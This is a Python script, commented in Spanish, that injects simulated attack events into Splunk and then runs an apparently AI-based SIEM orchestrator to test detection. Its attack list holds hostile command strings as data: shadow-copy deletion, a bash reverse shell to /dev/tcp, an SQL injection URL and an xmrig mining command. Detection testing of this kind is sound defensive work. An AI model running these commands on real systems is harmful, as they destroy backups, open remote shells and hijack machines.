import time
import json
import uuid
from datetime import datetime, timezone
# Importamos desde los bots principales
from bot2_siem.splunk_client import hec_send
from bot2_siem.orchestrator import run_once

# Lista de ataques simulados (MITRE ATT&CK)
ATTACKS = [
    {
        "name": "Ransomware (Windows)",
        "summary": "Process created: vssadmin.exe delete shadows /all /quiet",
        "source": "endpoint"
    },
    {
        "name": "Reverse Shell (Linux)",
        "summary": "PRUEBA: bash -i >& /dev/tcp/10.0.0.1/4444",
        "source": "linux"
    },
    {
        "name": "SQL Injection (Web)",
        "summary": "GET /login.php?id=1' OR '1'='1",
        "source": "network"
    },
    {
        "name": "Falso Positivo (Tráfico Normal)",
        "summary": "GET /index.html HTTP/1.1 200 OK. User-Agent: Mozilla/5.0",
        "source": "network"
    },
    {
        "name": "Cryptojacking",
        "summary": "Process created: xmrig --donate-level 1 -o pool.minexmr.com:4444",
        "source": "endpoint"
    }
]

def run_simulation():
    print("🚀 Iniciando Simulador de Ataques...")
    
    for attack in ATTACKS:
        # Generamos un ID único y la fecha actual
        event_id = f"sim-{uuid.uuid4().hex[:8]}"
        timestamp = datetime.now(timezone.utc).isoformat()
        
        # Creamos el evento
        event_data = {
            "event_id": event_id,
            "source_kind": attack["source"],
            "timestamp": timestamp,
            "src": "PC-VICTIMA-01",
            "summary": attack["summary"],
            "iocs": []
        }
        
        print(f"[*] Inyectando ataque: {attack['name']} (ID: {event_id})")
        exito = hec_send(event_data, sourcetype="nirvana:secops:event")
        
        if exito:
            print("    ✅ Inyectado en Splunk.")
        else:
            print("    ❌ Error al inyectar.")
            
        time.sleep(1) # Pequeña pausa para no saturar

    print("\n⏳ Esperando 5 segundos para que Splunk indexe los eventos...")
    time.sleep(5)

    print("\n🧠 Ejecutando el Orquestador (IA)...")
    resultado = run_once()
    
    print("\n=== RESULTADO DEL ORQUESTADOR ===")
    print(json.dumps(resultado, indent=2))
    print("==================================")

if __name__ == "__main__":
    run_simulation()